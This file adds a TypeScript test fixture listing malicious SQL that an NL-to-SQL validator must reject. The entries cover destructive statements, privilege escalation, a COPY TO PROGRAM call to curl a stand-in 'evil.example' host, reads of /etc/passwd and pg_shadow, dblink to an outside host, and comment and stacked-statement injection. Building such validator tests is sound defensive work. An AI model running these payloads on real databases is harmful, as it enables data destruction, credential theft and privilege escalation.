@@ -1,0 +1,78 @@
+/** Malicious / unsafe SQL that the validator must reject. Used by the unit tests and by `npm run eval`. */
+export interface UnsafeSql {
+  name: string;
+  sql: string;
+}
+
+export const UNSAFE_SQL: UnsafeSql[] = [
+  // ── destructive statements ──
+  { name: "drop table", sql: "DROP TABLE products;" },
+  { name: "drop schema", sql: "DROP SCHEMA shop CASCADE" },
+  { name: "delete all", sql: "DELETE FROM customers;" },
+  { name: "delete with where", sql: "DELETE FROM orders WHERE order_id = 1" },
+  { name: "update", sql: "UPDATE customers SET email = 'x@y.z'" },
+  { name: "insert", sql: "INSERT INTO customers (first_name) VALUES ('a')" },
+  { name: "truncate", sql: "TRUNCATE orders CASCADE" },
+  { name: "alter", sql: "ALTER TABLE orders ADD COLUMN x int" },
+  { name: "create table", sql: "CREATE TABLE evil (id int)" },
+  { name: "create table as", sql: "CREATE TABLE evil AS SELECT * FROM customers" },
+  { name: "grant", sql: "GRANT ALL ON customers TO PUBLIC" },
+  { name: "revoke", sql: "REVOKE SELECT ON customers FROM nl2sql_readonly" },
+  { name: "create role", sql: "CREATE ROLE hacker SUPERUSER LOGIN" },
+  { name: "copy to program", sql: "COPY customers TO PROGRAM 'curl evil.example'" },
+  { name: "copy from file", sql: "COPY customers FROM '/etc/passwd'" },
+  { name: "vacuum", sql: "VACUUM FULL" },
+  { name: "call", sql: "CALL some_procedure()" },
+  { name: "do block", sql: "DO $$ BEGIN DELETE FROM customers; END $$" },
+  { name: "set role", sql: "SET ROLE postgres" },
+  { name: "set session auth", sql: "SET SESSION AUTHORIZATION postgres" },
+  { name: "begin/commit", sql: "BEGIN; DELETE FROM customers; COMMIT;" },
+  { name: "explain analyze delete", sql: "EXPLAIN ANALYZE DELETE FROM customers" },
+  { name: "prepare", sql: "PREPARE x AS DELETE FROM customers" },
+  { name: "listen", sql: "LISTEN channel" },
+  // ── statement stacking / comment tricks ──
+  { name: "stacked drop", sql: "SELECT 1; DROP TABLE customers" },
+  { name: "stacked select", sql: "SELECT 1; SELECT 2" },
+  { name: "line comment injection", sql: "SELECT * FROM customers WHERE customer_id = 1 -- AND is_active" },
+  { name: "block comment injection", sql: "SELECT /* hidden */ * FROM customers" },
+  { name: "comment-split keyword", sql: "DR/**/OP TABLE customers" },
+  { name: "comment tautology", sql: "SELECT * FROM customers WHERE email = 'a' OR 1=1 --'" },
+  // ── data-modifying CTEs / INTO / locking ──
+  { name: "cte delete", sql: "WITH d AS (DELETE FROM customers RETURNING *) SELECT * FROM d" },
+  { name: "cte insert", sql: "WITH i AS (INSERT INTO customers (first_name) VALUES ('a') RETURNING *) SELECT * FROM i" },
+  { name: "select into", sql: "SELECT * INTO evil FROM customers" },
+  { name: "for update", sql: "SELECT * FROM customers FOR UPDATE" },
+  // ── dangerous functions ──
+  { name: "pg_sleep", sql: "SELECT pg_sleep(30)" },
+  { name: "pg_read_file", sql: "SELECT pg_read_file('/etc/passwd')" },
+  { name: "pg_ls_dir", sql: "SELECT * FROM pg_ls_dir('/')" },
+  { name: "set_config", sql: "SELECT set_config('search_path', 'public', false)" },
+  { name: "current_setting", sql: "SELECT current_setting('server_version')" },
+  { name: "lo_import", sql: "SELECT lo_import('/etc/passwd')" },
+  { name: "dblink", sql: "SELECT * FROM dblink('host=evil', 'select 1') AS t(x int)" },
+  { name: "query_to_xml", sql: "SELECT query_to_xml('select * from pg_shadow', true, true, '')" },
+  { name: "nextval", sql: "SELECT nextval('shop.customers_customer_id_seq')" },
+  { name: "pg_terminate", sql: "SELECT pg_terminate_backend(pid) FROM customers" },
+  { name: "version", sql: "SELECT version()" },
+  { name: "session user", sql: "SELECT current_user" },
+  { name: "regclass cast", sql: "SELECT 'pg_shadow'::regclass" },
+  { name: "schema-qualified function", sql: "SELECT public.evil_function(1)" },
+  // ── schemas & system catalogs ──
+  { name: "pg_shadow", sql: "SELECT * FROM pg_shadow" },
+  { name: "pg_catalog tables", sql: "SELECT * FROM pg_catalog.pg_tables" },
+  { name: "information_schema", sql: "SELECT * FROM information_schema.tables" },
+  { name: "public schema", sql: "SELECT * FROM public.users" },
+  { name: "app schema", sql: "SELECT * FROM nl2sql.query_runs" },
+  { name: "auth schema", sql: "SELECT * FROM auth.users" },
+  { name: "cross database", sql: "SELECT * FROM otherdb.shop.customers" },
+  { name: "unknown table", sql: "SELECT * FROM secrets" },
+  { name: "subquery to system table", sql: "SELECT * FROM customers WHERE customer_id IN (SELECT usesysid FROM pg_user)" },
+  // ── structural ──
+  { name: "empty", sql: "" },
+  { name: "whitespace", sql: "   \n  " },
+  { name: "only semicolon", sql: ";" },
+  { name: "garbage", sql: "hello world this is not sql" },
+  { name: "unknown column qualified", sql: "SELECT c.password FROM customers c" },
+  { name: "unknown column single table", sql: "SELECT ssn FROM customers" },
+  { name: "params", sql: "SELECT * FROM customers WHERE customer_id = $1" },
+];
